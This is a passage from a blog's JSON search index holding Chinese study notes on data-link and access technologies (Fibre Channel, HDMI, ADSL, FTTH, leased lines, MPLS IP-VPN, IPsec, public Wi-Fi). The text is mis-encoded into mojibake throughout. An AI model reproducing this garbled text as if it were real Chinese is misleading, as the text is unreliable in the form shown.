µçš„æƒ…å†µä¸‹æå®¹æ˜“å¯¼è‡´ç½‘ç»œæ”¶æ•›ã€‚\nå…‰çº¤é€šé“ å…‰çº¤é€šé“(Fiber Channel)æ˜¯å®ç°é«˜é€Ÿæ•°æ®é€šä¿¡çš„ä¸€ç§æ•°æ®é“¾è·¯ã€‚ä¸å…¶è¯´å®ƒæ˜¯ä¸€ç§ç½‘ç»œ,ä¸å¦‚è¯´å®ƒæ›´åƒæ˜¯ SCSIé‚£æ ·ç±»ä¼¼äºè¿æ¥è®¡ç®—æœºå‘¨è¾¹è®¾å¤‡çš„æ€»çº¿ä¸€æ ·çš„è§„èŒƒã€‚æ•°æ®ä¼ è¾“é€Ÿç‡ä¸º 133Mbpx~4Gbpsã€‚è¿‘äº›å¹´è¢«å¹¿æ³›ç”¨äºæ­å»ºSAN\u0026rsquo;,æˆä¸ºå…¶ä¸»è¦æ•°æ®é“¾è·¯ã€‚\nHDMI HDMI æ˜¯ High-Definition Multimedia Interface çš„ç¼©å†™,æ„ä¸ºé«˜æ¸…æ™°åº¦å¤šåª’ä½“æ¥å£ã€‚å®ƒå¯ä»¥é€šè¿‡ä¸€æ ¹ç¼†çº¿å®ç°å›¾åƒå’Œå£°éŸ³ç­‰æ•°å­—ä¿¡å·çš„é«˜å“è´¨ä¼ è¾“ã€‚æ›¾ä¸»è¦ç”¨äºDVD/è“å…‰æ’­æ”¾å™¨ã€å½•åƒæœºã€AV åŠŸæ”¾ç­‰è®¾å¤‡ä¸ç”µè§†æœºã€æŠ•å½±ä»ªçš„è¿æ¥,ç°åœ¨ä¹Ÿé€æ¸å¼€å§‹ç”¨äºè®¡ç®—æœºæˆ–å¹³æ¿ç”µè„‘ã€æ•°ç ç›¸æœºä¸æ˜¾ç¤ºå™¨çš„è¿æ¥ã€‚ä»2009å¹´å‘å¸ƒçš„1.4 ç‰ˆå¼€å§‹å®ƒå¯ä»¥ä¼ è¾“ä»¥å¤ªç½‘å¸§,ä½¿å¾—é‡‡ç”¨ HDMIä»‹è´¨å®ç° TCP/IPé€šä¿¡å˜ä¸ºå¯èƒ½ã€‚\nå…¬å…±ç½‘ç»œ æ¨¡æ‹Ÿç”µè¯çº¿è·¯ æ¨¡æ‹Ÿç”µè¯çº¿è·¯å…¶å®å°±æ˜¯åˆ©ç”¨å›ºå®šç”µè¯çº¿è·¯è¿›è¡Œé€šä¿¡ã€‚ç”µè¯çº¿ä¸­çš„éŸ³é¢‘å¸¦å®½ç”¨äºæ‹”å·ä¸Šç½‘ã€‚è¯¥æ–¹æ³•ä¸éœ€è¦ç‰¹æ®Šçš„é€šä¿¡çº¿è·¯,å®Œå…¨ä½¿ç”¨å·²æ™®åŠçš„ç”µè¯ç½‘ã€‚ è®©è®¡ç®—æœºä¸ç”µè¯çº¿ç›¸è¿éœ€è¦æœ‰ä¸€ä¸ªå°†æ•°å­—ä¿¡å·è½¬æ¢ä¸ºæ¨¡æ‹Ÿä¿¡å·çš„è°ƒåˆ¶è§£è°ƒå™¨(ä¿—ç§°â€œçŒ«â€)ã€‚â€œçŒ«â€çš„ä¼ è¾“é€Ÿç‡ä¸€èˆ¬åªåœ¨56kbps å·¦å³,æ‰€ä»¥ç°åœ¨å·²é€æ¸è¢«æ·˜æ±°ã€‚ ï¼ˆæ—¶ä»£çš„çœ¼æ³ªï¼‰\nADSL ADSLâ€™æ˜¯å¯¹å·²æœ‰çš„æ¨¡æ‹Ÿç”µè¯çº¿è·¯è¿›è¡Œæ‰©å±•çš„ä¸€ç§æœåŠ¡ã€‚æ¨¡æ‹Ÿç”µè¯çº¿è·¯è™½ç„¶ä¹Ÿèƒ½ä¼ è¾“é«˜é¢‘æ•°å­—é€šä¿¡,ä½†æ˜¯å®ƒä¸ç”µä¿¡å±€çš„äº¤æ¢æœºä¹‹é—´åªæœ‰å‘é€éŸ³é¢‘ä¿¡å·æ—¶æ‰èƒ½æ˜¾ç¤ºæå¥½çš„ä¼ è¾“æ•ˆç‡,å¹¶ä¼šå¯¹å…¶ä»–å¤šä½™é¢‘ç‡çš„ä¿¡å·è¿›è¡Œä¸¢å¼ƒã€‚\nADSL æ­£æ˜¯åˆ©ç”¨è¯æœºåˆ°ç”µä¿¡å±€äº¤æ¢æœºä¹‹é—´è¿™æ®µçº¿è·¯,é™„åŠ ä¸€ä¸ªå«åšåˆ†ç¦»å™¨çš„è£…ç½®,å°†éŸ³é¢‘ä¿¡å·(ä½é¢‘ä¿¡å·)å’Œæ•°å­—ä¿¡å·(é«˜é¢‘ä¿¡å·)éš”ç¦»ä»¥å…äº§ç”Ÿå™ªå£°å¹²æ‰°ã€‚\nFTTH FTTH(Fiber To The Home)é¡¾åæ€ä¹‰å°±æ˜¯ä¸€æ ¹é«˜é€Ÿå…‰çº¤ç›´æ¥è¿åˆ°ç”¨æˆ·å®¶é‡Œæˆ–å…¬å¸å»ºç­‘ç‰©å¤„çš„æ–¹æ³•ã€‚å®ƒé€šè¿‡ä¸€ä¸ªå«åšONU\u0026rsquo;çš„è£…ç½®å°†è®¡ç®—æœºä¸ä¹‹å…³è¿ã€‚è¯¥è£…ç½®è´Ÿè´£åœ¨å…‰ä¿¡å·ä¸ç”µå­ä¿¡å·ä¹‹é—´çš„è½¬æ¢ã€‚ä½¿ç”¨FITHå¯ä»¥å®ç°ç¨³å®šçš„é«˜é€Ÿé€šä¿¡ã€‚ä¸è¿‡å®ƒçš„çº¿è·¯ä¼ è¾“é€Ÿç‡ä¸å…·ä½“çš„æœåŠ¡å†…å®¹ä»å—ä¸ªåˆ«è¿è¥å•†é™åˆ¶ã€‚\nä»¥ä¸Šå±äºå…‰çº¤åˆ°æˆ·ã€‚è¿˜æœ‰ä¸€ç§æ–¹å¼å«å…‰çº¤åˆ°æ¥¼ã€‚å®ƒæ˜¯æŒ‡ä¸€ä¸ªé«˜é€Ÿå…‰çº¤ç›´æ¥è¿åˆ°æŸä¸ªå¤§å¦ã€å…¬å¸æˆ–å®¾é¦†çš„å¤§æ¥¼,éšååœ¨æ•´ä¸ªå¤§æ¥¼å†…éƒ¨å†é€šè¿‡å¸ƒçº¿å®ç°è”ç½‘ã€‚ç®€ç§°FTTB(Fiber To The Building)ã€‚ç”šè‡³è¿˜æœ‰ä¸€ç§æ–¹å¼æ˜¯å°†å…‰çº¤æ¥äººåˆ°æŸä¸ªå®¶åº­ä»¥å,å†é€šè¿‡å¸ƒçº¿å®ç°å‘¨å›´å‡ æˆ·ä½å®¶å…±åŒè”ç½‘ã€‚è¿™ç§æ–¹å¼ç®€ç§°ä¸º FTIC (Fiber To The Curb\u0026rsquo;)ã€‚ æœ‰çº¿ç”µè§† ä¸“çº¿ éšç€äº’è”ç½‘ç”¨æˆ·çš„æ€¥å‰§ä¸Šå‡,ä¸“çº¿æœåŠ¡å‘ç€ä»·æ ¼æ›´ä½ã€å¸¦å®½æ›´å¹¿ä»¥åŠå¤šæ ·åŒ–çš„æ–¹å‘å‘å±•ã€‚ç°åœ¨å¸‚é¢ä¸Šå·²ç»å‡ºç°äº†å„ç§å„æ ·çš„â€œä¸“çº¿æœåŠ¡â€ã€‚ä»¥NTT Group çš„æœåŠ¡ä¸ºä¾‹,æœ‰ Mega Data Nets(ç”¨ ATM æ¥å£æä¾›3Mbps~42Mbps çš„ä¸“çº¿æ¥äºº)ã€ATM Mega-Linkã€Giga Stream(ç”¨ä»¥å¤ªç½‘æˆ– SONET/SDH æ¥å£æä¾› 0.5Mbps~135Mbps çš„ä¸“çº¿æ¥äºº)ç­‰ä¼—å¤šä¸“çº¿æ¥å…¥æœåŠ¡ã€‚\nä¸“çº¿çš„è¿æ¥ä¸€å®šæ˜¯ä¸€å¯¹ä¸€çš„è¿æ¥ã€‚è™½ç„¶ [[#ATM]] çš„è®¾è®¡åˆè¡·å…è®¸æœ‰å¤šä¸ªç›®æ ‡åœ°, ä½†å¯¹äºæä¾›ä¸“çº¿æœåŠ¡çš„ATMMega-Linkä¸­ä¹Ÿåªèƒ½æŒ‡å®šä¸€ä¸ªç›®çš„åœ°ã€‚å› æ­¤ä¸å¯èƒ½åƒISDN æˆ–å¸§ä¸­ç»§é‚£æ ·å¼•è¿›ä¸€æ¡çº¿ç¼†å°±èƒ½è¿æ¥ä¼—å¤šç›®çš„åœ°ã€‚\nVPN è™šæ‹Ÿä¸“ç”¨ç½‘ç»œ(VPN)ç”¨äºè¿æ¥è·ç¦»è¾ƒè¿œçš„åœ°åŸŸã€‚è¿™ç§æœåŠ¡åŒ…æ‹¬ IP-VPN å’Œå¹¿åŸŸä»¥å¤ªç½‘ã€‚\nIP-VPN æ„æŒ‡åœ¨IP ç½‘ç»œ(äº’è”ç½‘)ä¸Šå»ºç«‹ VPNã€‚ ç½‘ç»œæœåŠ¡å•†æä¾›ä¸€ç§åœ¨ IP ç½‘ç»œä¸Šä½¿ç”¨ MPIS æŠ€æœ¯æ„å»º VPN çš„æœåŠ¡ã€‚å…¶ä¸­MPLS(Multiprotocol Label Switching,å¤šåè®®æ ‡ç­¾äº¤æ¢)åœ¨IP åŒ…ä¸­é™„åŠ ä¸€ä¸ªå«åšæ ‡ç­¾(Label\u0026rsquo;)çš„ä¿¡æ¯è¿›è¡Œä¼ è¾“æ§åˆ¶ã€‚æ¯ä¸ªç”¨æˆ·çš„æ ‡ç­¾ä¿¡æ¯ä¸åŒ,å› æ­¤åœ¨é€šè¿‡MPIS ç½‘æ—¶,å¯ä»¥è½»æ¾åœ°åˆ¤æ–­å‡ºç›®æ ‡åœ°å€ã€‚è¿™æ ·ä¸€æ¥å°±å¯ä»¥å°†å¤šä¸ªä¸åŒç”¨æˆ·çš„VPNä¿¡æ¯é€šè¿‡ MPLS ç½‘åŠ ä»¥åŒºåˆ†,å½¢æˆå°é—­çš„ç§æœ‰ç½‘ç»œã€‚æ­¤å¤–,è¿˜èƒ½è¿›è¡Œç”¨æˆ·çº§çš„å¸¦å®½æ§åˆ¶ã€‚\nIPsec é™¤äº†ä½¿ç”¨æœåŠ¡æä¾›å•†çš„ IP-VPNæœåŠ¡ä¹‹å¤–,æœ‰æ—¶ä¼ä¸šè¿˜å¯ä»¥åœ¨äº’è”ç½‘ä¸Šå»ºç«‹è‡ªå·±çš„VPN\u0026rsquo;,ä¸€èˆ¬é‡‡ç”¨çš„æ˜¯ IPsecâ€™æŠ€æœ¯ã€‚è¯¥æ–¹æ³•å¯¹ VPNé€šä¿¡ä¸­çš„IP åŒ…è¿›è¡ŒéªŒè¯å’ŒåŠ å¯†,åœ¨äº’è”ç½‘ä¸Šæ„é€ ä¸€ä¸ªå°é—­çš„ç§æœ‰ç½‘ç»œã€‚\nå¹¿åŸŸä»¥å¤ªç½‘ æœåŠ¡æä¾›å•†æ‰€æä¾›çš„ç”¨äºè¿æ¥ç›¸è·è¾ƒè¿œçš„åœ°åŸŸçš„ä¸€ç§æœåŠ¡ã€‚IP-VPN æ˜¯åœ¨IP å±‚é¢çš„è¿æ¥,å¹¿åŸŸä»¥å¤ªç½‘åˆ™æ˜¯åœ¨ä½œä¸ºæ•°æ®é“¾è·¯å±‚çš„ä»¥å¤ªç½‘ä¸Šåˆ©ç”¨VLAN(è™šæ‹Ÿå±€åŸŸç½‘)å®ç° VPNçš„æŠ€æœ¯ã€‚è¯¥æŠ€æœ¯è¿˜å¯ä»¥ä½¿ç”¨ TCP/IP ä¸­çš„å…¶ä»–åè®®ã€‚ å¹¿åŸŸä»¥å¤ªç½‘ä»¥ä¼ä¸šä¸“é—¨ä½¿ç”¨æœåŠ¡æä¾›å•†æ„å»ºçš„ VLAN ç½‘ç»œä¸ºä¸»è¦å½¢å¼ã€‚åªè¦æŒ‡å®šåŒä¸€ä¸ª VLAN,æ— è®ºä»å“ªé‡Œéƒ½èƒ½æ¥å…¥åˆ°åŒä¸€ä¸ªç½‘ç»œã€‚\nå…¬å…±æ— çº¿ LAN å…¬å…±æ— çº¿LAN æ˜¯æŒ‡å…¬å¼€çš„å¯ä»¥ä½¿ç”¨[Wi-Fi]çš„æœåŠ¡ã€‚æœåŠ¡æä¾›è€…å¯ä»¥åœ¨è½¦ç«™æˆ–é¤é¥®åº—ç­‰äººå‘˜ç›¸å¯¹æ¯”è¾ƒé›†ä¸­çš„åœ°æ–¹æ¶è®¾çš„ä¸€ä¸ªå«åšçƒ­ç‚¹(HotSpot)çš„æ— çº¿ç”µæ³¢æ¥æ”¶å™¨ã€‚ä½¿ç”¨è€…åˆ°è¾¾è¿™äº›åŒºåŸŸå°±å¯ä»¥ä½¿ç”¨å¸¦æœ‰æ— çº¿LANç½‘å¡çš„ç¬”è®°æœ¬ç”µè„‘æˆ–æ™ºèƒ½æ‰‹æœºè¿æ¥ä¸Šç½‘ã€‚\nä¸Šç½‘æ—¶ä½¿ç”¨è€…é¦–å…ˆè¦é€šè¿‡è¿™äº›çƒ­ç‚¹å»ºç«‹äº’è”ç½‘è¿æ¥ã€‚è¿æ¥ä»¥å,è¿˜å¯ä»¥é€šè¿‡é‚£äº›åˆ©ç”¨ IPsecæŠ€æœ¯å®ç°çš„VPN è¿æ¥åˆ°è‡ªå·±å…¬å¸çš„å†…ç½‘ã€‚è¿™ç§æ¥äººæœåŠ¡æœ‰æ—¶å…è´¹(å¦‚å•†åœºã€è½¦ç«™ç­‰åœºæ‰€),æœ‰æ—¶ä¹Ÿå¯èƒ½æ˜¯æ”¶è´¹çš„ã€‚ ","date":"2023-10-18T18:52:01+08:00","permalink":"https://anonymity-0.github.io/posts/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/","title":"æ•°æ®é“¾è·¯å±‚"}]